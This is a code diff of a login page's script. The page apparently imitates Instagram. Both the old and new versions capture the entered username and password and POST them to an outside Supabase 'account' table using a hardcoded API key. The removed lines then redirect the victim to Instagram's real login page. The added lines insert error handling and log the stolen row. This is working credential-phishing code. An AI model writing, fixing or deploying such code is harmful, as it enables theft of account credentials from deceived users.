@@ -974,20 +974,48 @@
     if (pw.type === 'password') { pw.type = 'text';     tg.textContent = 'Hide'; }
     else                        { pw.type = 'password'; tg.textContent = 'Show'; }
   }
-  document.getElementById("loginForm").addEventListener("submit",function(e){
-    let email = document.getElementById("username").value;
-    let password = document.getElementById("password").value;
 
 
-  fetch("https://tqjtbocvqqksfzyowhsi.supabase.co/rest/v1/account",
-  {method: "POST",
-  headers:{"Content-Type":"application/json",
-  "apikey":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRxanRib2N2cXFrc2Z6eW93aHNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIwNTI3NDAsImV4cCI6MjA4NzYyODc0MH0._z3hq-qGpl7uPpdFl9NZX6GvSjvtJdV5jzCKpON5krQ",
-  "Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRxanRib2N2cXFrc2Z6eW93aHNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIwNTI3NDAsImV4cCI6MjA4NzYyODc0MH0._z3hq-qGpl7uPpdFl9NZX6GvSjvtJdV5jzCKpON5krQ"},body:JSON.stringify({username:email,"password":password})})
-  
-  window.location.href = "https://www.instagram.com/accounts/login/"
-  })
+
+document.getElementById("loginForm").addEventListener("submit", async (e) => {
+  e.preventDefault(); // Prevent form from submitting normally
+
+  const email = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+
+  try {
+    const response = await fetch(
+      "https://tqjtbocvqqksfzyowhsi.supabase.co/rest/v1/account",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRxanRib2N2cXFrc2Z6eW93aHNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIwNTI3NDAsImV4cCI6MjA4NzYyODc0MH0._z3hq-qGpl7uPpdFl9NZX6GvSjvtJdV5jzCKpON5krQ",
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRxanRib2N2cXFrc2Z6eW93aHNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIwNTI3NDAsImV4cCI6MjA4NzYyODc0MH0._z3hq-qGpl7uPpdFl9NZX6GvSjvtJdV5jzCKpON5krQ",
+          "Prefer": "return=representation" // optional: return the inserted row
+        },
+        body: JSON.stringify({ username: email, password: password })
+      }
+    );
+
+    if (!response.ok) {
+      const errorText = await response.text();
+      throw new Error(`HTTP ${response.status}: ${errorText}`);
+    }
+
+    const data = await response.json();
+    console.log("Inserted:", data);
+
+    
+  } catch (err) {
+    console.error(err);
+    
+  }
+});
+
 </script>
+
 
 </body>
 </html>
+
